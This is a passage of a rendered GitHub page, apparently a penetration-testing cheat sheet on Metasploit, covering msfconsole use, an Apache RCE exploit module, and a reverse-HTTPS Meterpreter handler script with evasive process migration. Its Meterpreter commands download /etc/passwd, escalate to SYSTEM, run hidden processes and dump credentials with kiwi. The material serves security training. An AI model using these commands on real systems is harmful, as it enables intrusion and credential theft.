dir=\"auto\" data-snippet-clipboard-copy-content=\"# initialize the metasploit postgres database\nsudo msfdb init\n\n# enable postgres to start on boot\nsudo systemctl enable postgresql\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e initialize the metasploit postgres database\u003c/span\u003e\nsudo msfdb init\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e enable postgres to start on boot\u003c/span\u003e\nsudo systemctl \u003cspan class=\"pl-c1\"\u003eenable\u003c/span\u003e postgresql\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAfter the database starts, you can use any of the following commands to manage the database:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ccode\u003emsfdb reinit\u003c/code\u003e - Deletes and reinitializes the database.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003emsfdb delete\u003c/code\u003e - Deletes the database.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003emsfdb start\u003c/code\u003e - Starts the database.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003emsfdb stop\u003c/code\u003e - Stops the database.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003emsfdb status\u003c/code\u003e - Shows the database status.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.4.1 Interacting with Metasploit via \u003ccode\u003emsfconsole\u003c/code\u003e\u003c/h3\u003e\u003ca id=\"user-content-341-interacting-with-metasploit-via-msfconsole\" class=\"anchor\" aria-label=\"Permalink: 3.4.1 Interacting with Metasploit via msfconsole\" href=\"#341-interacting-with-metasploit-via-msfconsole\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eMost common \u003ccode\u003emsfconsole\u003c/code\u003e commands:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# get list of commands or detailed help\nhelp [COMMAND]\n# find module you want\nsearch KEYWORDS...\n# activate the module\nuse NUM\n# get detailed info about active module\ninfo\n# view module options\nshow options\n# set module options\nset OPTION VALUE\n# execute the module\nrun\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get list of commands or detailed help\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003ehelp\u003c/span\u003e [COMMAND]\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e find module you want\u003c/span\u003e\nsearch KEYWORDS...\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e activate the module\u003c/span\u003e\nuse NUM\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get detailed info about active module\u003c/span\u003e\ninfo\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e view module options\u003c/span\u003e\nshow options\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e set module options\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eset\u003c/span\u003e OPTION VALUE\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e execute the module\u003c/span\u003e\nrun\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eDetailed interaction reference:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# start the console\n# optional args:\n# -q : don't display animations, banner, and version on start\n# -x '\u0026lt;COMMANDS\u0026gt;' : commands to run on start (quote the entire command string).\n#                   Multiple commands separated by semicolon.\n# -r FILE : load resource script (.rc) file and run those commands at start\n#           (see section on resource scripts)\nmsfconsole\n\n\n# inside the msfconsole:\n\n# check the database status\nmsf6\u0026gt; db_status\n# check what workspace you're using\n# workspaces help isolate data from different assessments/subnets\n# (the database saves everything)\nmsf6\u0026gt; workspace\n# add a workspace\nmsf6\u0026gt; workspace -a NAME\n# change workspaces\nmsf6\u0026gt; workspace OTHERNAME\n# delete workspace\nmsf6\u0026gt; workspace -d NAME\n\n\n# working with modules:\n\n# search for module containing specific keywords\nmsf6\u0026gt; search Apache 2.4.49\n# restrict search to exploits\nmsf6\u0026gt; search type:exploit smb\n# restrict search to auxiliary modules (scanners, brute-forcers, etc.)\nmsf6\u0026gt; search type:auxiliary smb\n# view description, reliability, etc. info of a module\n# if you want to view info on active module, omit arg\nmsf6\u0026gt; info [module-name-or-search-number]\n# Choose a module to activate\nmsf6\u0026gt; use 56\n# view arguments/options to set for active module\n# at a minimum, RHOSTS is usually a required arg\nmsf6 auxiliary(scanner/smb/smb_version) \u0026gt; show options\n# set value for option (option name not case-sensitive)\nmsf6 auxiliary(scanner/smb/smb_version) \u0026gt; set rhosts VICTIM_IP\n# unset an option\nmsf6 auxiliary(scanner/smb/smb_version) \u0026gt; unset rhosts\n# set RHOSTS based on discovered hosts/services in database\nmsf6 auxiliary(scanner/smb/smb_version) \u0026gt; services -p 445 --rhosts\n# set (global) option to persist accross all modules\nmsf6 auxiliary(scanner/smb/smb_version) \u0026gt; setg rhosts VICTIM_IP\n# unset a global option\nmsf6 auxiliary(scanner/smb/smb_version) \u0026gt; unsetg rhosts\n# show advanced options for the module\nmsf6 auxiliary(scanner/smb/smb_version) \u0026gt; show advanced\n# execute the active module (once required options set)\nmsf6 auxiliary(scanner/smb/smb_version) \u0026gt; run\n\n# when working with exploits\n\n# show list of all compatible payloads for active exploit module\nmsf6 exploit(multi/http/apache_normalize_path_rce) \u0026gt; show payloads\n# chose payload to use (can use number from 'show payloads')\nmsf6 exploit(multi/http/apache_normalize_path_rce) \u0026gt; set payload NUM_OR_NAME\n# set payload options same way as exploit module options\n# (you can specify an interface name, and it'll auto-pull your IP)\nmsf6 exploit(multi/http/apache_normalize_path_rce) \u0026gt; set lhost tun0\n\n\n# using data stored in the database:\n\n# run nmap scan and save results to msfdb workspace\nmsf6\u0026gt; db_nmap \u0026lt;nmap-options\u0026gt;\n# list all discovered hosts in msfdb workspace\nmsf6\u0026gt; hosts\n# NOTE: you an tag hosts and search by tags.\n# see: https://docs.rapid7.com/metasploit/tagging-hosts-in-msfconsole\n# list all discovered services\nmsf6\u0026gt; services\n# list all discovered services for port 8000\nmsf6\u0026gt; services -p 8000\n# check if metasploit automatically detected any vulnerabilities\nmsf6\u0026gt; vulns\n# view any saved/discovered credentials from brute force scans\nmsf6\u0026gt; creds\n\n\n# meterpreter sessions and routing tables:\n\n# view list of sessions\nmsf6\u0026gt; sessions\n# resume interaction on backgrounded session\nmsf6\u0026gt; sessions -i SESS_ID\n# add route to metasploit's routing table for attacking internal targets\n# this lets you do things like run port scans or throw exploits against\n# internal hosts from inside metasploit\nmsf6\u0026gt; route add CIDR_INTERNAL_SUBNET SESSION_ID\n# view existing msf routing table\nmsf6\u0026gt; route print\n# clear all routes from table\nmsf6\u0026gt; route flush\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start the console\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e optional args:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -q : don't display animations, banner, and version on start\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -x '\u0026lt;COMMANDS\u0026gt;' : commands to run on start (quote the entire command string).\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e                   Multiple commands separated by semicolon.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -r FILE : load resource script (.rc) file and run those commands at start\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e           (see section on resource scripts)\u003c/span\u003e\nmsfconsole\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e inside the msfconsole:\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check the database status\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e db_status\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check what workspace you're using\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e workspaces help isolate data from different assessments/subnets\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e (the database saves everything)\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e workspace\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e add a workspace\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e workspace -a NAME\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e change workspaces\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e workspace OTHERNAME\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e delete workspace\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e workspace -d NAME\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e working with modules:\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e search for module containing specific keywords\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e search Apache 2.4.49\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e restrict search to exploits\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e search type:exploit smb\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e restrict search to auxiliary modules (scanners, brute-forcers, etc.)\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e search type:auxiliary smb\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e view description, reliability, etc. info of a module\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if you want to view info on active module, omit arg\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e info [module-name-or-search-number]\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Choose a module to activate\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e use 56\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e view arguments/options to set for active module\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e at a minimum, RHOSTS is usually a required arg\u003c/span\u003e\nmsf6 auxiliary(scanner/smb/smb_version) \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e show options\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e set value for option (option name not case-sensitive)\u003c/span\u003e\nmsf6 auxiliary(scanner/smb/smb_version) \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eset\u003c/span\u003e rhosts VICTIM_IP\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e unset an option\u003c/span\u003e\nmsf6 auxiliary(scanner/smb/smb_version) \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eunset\u003c/span\u003e rhosts\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e set RHOSTS based on discovered hosts/services in database\u003c/span\u003e\nmsf6 auxiliary(scanner/smb/smb_version) \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e services -p 445 --rhosts\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e set (global) option to persist accross all modules\u003c/span\u003e\nmsf6 auxiliary(scanner/smb/smb_version) \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e setg rhosts VICTIM_IP\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e unset a global option\u003c/span\u003e\nmsf6 auxiliary(scanner/smb/smb_version) \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e unsetg rhosts\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e show advanced options for the module\u003c/span\u003e\nmsf6 auxiliary(scanner/smb/smb_version) \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e show advanced\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e execute the active module (once required options set)\u003c/span\u003e\nmsf6 auxiliary(scanner/smb/smb_version) \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e run\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e when working with exploits\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e show list of all compatible payloads for active exploit module\u003c/span\u003e\nmsf6 exploit(multi/http/apache_normalize_path_rce) \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e show payloads\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e chose payload to use (can use number from 'show payloads')\u003c/span\u003e\nmsf6 exploit(multi/http/apache_normalize_path_rce) \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eset\u003c/span\u003e payload NUM_OR_NAME\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e set payload options same way as exploit module options\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e (you can specify an interface name, and it'll auto-pull your IP)\u003c/span\u003e\nmsf6 exploit(multi/http/apache_normalize_path_rce) \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eset\u003c/span\u003e lhost tun0\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using data stored in the database:\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e run nmap scan and save results to msfdb workspace\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e db_nmap \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003enmap-options\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all discovered hosts in msfdb workspace\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e hosts\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e NOTE: you an tag hosts and search by tags.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e see: https://docs.rapid7.com/metasploit/tagging-hosts-in-msfconsole\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all discovered services\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e services\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all discovered services for port 8000\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e services -p 8000\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check if metasploit automatically detected any vulnerabilities\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e vulns\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e view any saved/discovered credentials from brute force scans\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e creds\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e meterpreter sessions and routing tables:\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e view list of sessions\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e sessions\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e resume interaction on backgrounded session\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e sessions -i SESS_ID\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e add route to metasploit's routing table for attacking internal targets\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e this lets you do things like run port scans or throw exploits against\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e internal hosts from inside metasploit\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e route add CIDR_INTERNAL_SUBNET SESSION_ID\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e view existing msf routing table\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e route print\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e clear all routes from table\u003c/span\u003e\nmsf\u003cspan class=\"pl-k\"\u003e6\u0026gt;\u003c/span\u003e route flush\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.4.2 Metasploit Resource Scripts\u003c/h3\u003e\u003ca id=\"user-content-342-metasploit-resource-scripts\" class=\"anchor\" aria-label=\"Permalink: 3.4.2 Metasploit Resource Scripts\" href=\"#342-metasploit-resource-scripts\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWhen starting \u003ccode\u003emsfconsole\u003c/code\u003e with the \u003ccode\u003e-r\u003c/code\u003e flag, you pass it a \"resources\" script (\u003ccode\u003e.rc\u003c/code\u003e) file that contains a series of instructions to run as soon as metasploit starts.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNOTE:\u003c/strong\u003e There are lots of pre-made resource scripts located here:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"ls -l /usr/share/metasploit-framework/scripts/resource\"\u003e\u003cpre\u003els -l /usr/share/metasploit-framework/scripts/resource\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eHere is an example file. The script looks exactly like a series of commands you'd type in the interactive console.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"use exploit/multi/handler\nset payload windows/meterpreter_reverse_https\nset lhost LHOST\nset lport 443\n# cause the spawned Meterpreter to automatically launch a background notepad.exe\n# process and migrate to it. Automating process migration helps to avoid \n# situations where our payload is killed prematurely either by defensive \n# mechanisms or the termination of the related process\nset AutoRunScript post/windows/manage/migrate\n# ensure that the listener keeps accepting new connections after a session is created\nset ExitOnSession false\n# run module as a job in the background and stop us from automatically interacting with the session\nrun -z -j\"\u003e\u003cpre\u003euse exploit/multi/handler\n\u003cspan class=\"pl-c1\"\u003eset\u003c/span\u003e payload windows/meterpreter_reverse_https\n\u003cspan class=\"pl-c1\"\u003eset\u003c/span\u003e lhost LHOST\n\u003cspan class=\"pl-c1\"\u003eset\u003c/span\u003e lport 443\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e cause the spawned Meterpreter to automatically launch a background notepad.exe\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e process and migrate to it. Automating process migration helps to avoid \u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e situations where our payload is killed prematurely either by defensive \u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e mechanisms or the termination of the related process\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eset\u003c/span\u003e AutoRunScript post/windows/manage/migrate\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e ensure that the listener keeps accepting new connections after a session is created\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eset\u003c/span\u003e ExitOnSession \u003cspan class=\"pl-c1\"\u003efalse\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e run module as a job in the background and stop us from automatically interacting with the session\u003c/span\u003e\nrun -z -j\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.4.3 Meterpreter command basics\u003c/h3\u003e\u003ca id=\"user-content-343-meterpreter-command-basics\" class=\"anchor\" aria-label=\"Permalink: 3.4.3 Meterpreter command basics\" href=\"#343-meterpreter-command-basics\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOne payload option is to use the Meterpreter agent. It drops you into a command shell that lets you do all sorts of fun stuff easily (port forwarding, key-logging, screen grabbing, etc.).\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# view list of meterpreter commands\nmeterpreter\u0026gt; help\n# get information about victim system\nmeterpreter\u0026gt; sysinfo\n# get username\nmeterpreter\u0026gt; getuid\n# drop into interactive bash/cmd.exe shell\nmeterpreter\u0026gt; shell\n# to suspend the shell to background, use Ctrl+z\n# list backgrounded shells (called 'channels'):\nmeterpreter\u0026gt; channel -l\n# interact with backgrounded channel (shell)\nmeterpreter\u0026gt; channel -i NUM\n# download file from victim\nmeterpreter\u0026gt; download /etc/passwd\n# upload file to victim\nmeterpreter\u0026gt; upload /usr/bin/unix-privesc-check /tmp/\n# attempt to auto-privesc to SYSTEM (on Windows host)\nmeterpreter\u0026gt; getsystem\n# migrate your process to the memory of another process\nmeterpreter\u0026gt; ps # find another process running with same user as you\nmeterpreter\u0026gt; migrate PID # move your process to the memory of another process\n# spawn a process hidden ('-H') from user (no window)\nmeterpreter\u0026gt; execute -H -f iexplore.exe\n# use mimikatz functionality to grab credentials\nmeterpreter\u0026gt; load kiwi\nmeterpreter\u0026gt; creds_all\n# add local port forward rule via meterpreter\nmeterpreter\u0026gt; portfwd add -l LPORT -p RPORT -r RHOST\n# send this meterpreter session to background (return to msf console)\nmeterpreter\u0026gt; bg\n# shut down meterpreter agent\nmeterpreter\u0026gt; exit\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e view list of meterpreter commands\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ehelp\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get information about victim system\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e sysinfo\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get username\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e getuid\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e drop into interactive bash/cmd.exe shell\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e shell\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to suspend the shell to background, use Ctrl+z\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list backgrounded shells (called 'channels'):\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e channel -l\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e interact with backgrounded channel (shell)\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e channel -i NUM\n\u003cspan 